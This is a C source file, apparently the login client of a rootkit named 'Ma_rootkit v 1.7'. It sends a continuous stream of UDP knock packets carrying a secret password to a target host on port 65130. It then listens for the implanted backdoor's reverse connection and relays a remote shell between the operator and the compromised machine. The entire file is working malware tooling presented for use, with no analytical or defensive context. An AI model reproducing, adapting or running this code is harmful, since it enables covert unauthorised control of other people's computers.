#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>

#include "rootkit_conf.h"

int main(int argc, char *argv[]){
int s,fd,pid;
char el_parol[32],buf[1024];
struct sockaddr_in k;

if (argc < 2){ 
     printf("Ma_rootkit v 1.7 r_login client\n  Usage: %s <host>\n",argv[0]);
     exit(-1);
}

if ((pid = fork()) == 0){

    sleep(1); // synchonyze with binder

    memset(&k,0,15);
    k.sin_family = AF_INET;
    k.sin_port   = htons(65130);

    s = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP);
    k.sin_addr.s_addr = inet_addr(argv[1]);
    memset(&el_parol,0,31);

    sprintf(el_parol,"%s\n",R_LOGIN);
    printf("[+] start sending id-packets\n");

    while(1)
      sendto(s,el_parol,strlen(el_parol),0,(struct sockaddr *)&k,16);
}   

s = socket(AF_INET,SOCK_STREAM,0);
memset(&k,0,15);
k.sin_family = AF_INET;
k.sin_port = htons(65130);

bind(s,(struct sockaddr *)&k,16);
listen(s,0);

fd = accept(s,0,0);
kill(pid,9);
close(s);
printf("[+] got shell connection\n");

if ((pid = fork()) == 0){

  while(1){
    memset(&buf,0,1024);
    if ( read(fd,buf,1024) < 0){
      close(fd);
      kill(getpid(),9);
      exit(1);
    }
    write(1,buf,1024);
  }

}

while(1){
  
  memset(&buf,0,1024);
  if ( read(1,buf,1024) < 0){
    close(fd);
    kill(pid,9);
    exit(1);
  }
  
  write(fd,buf,1024);  
}

}

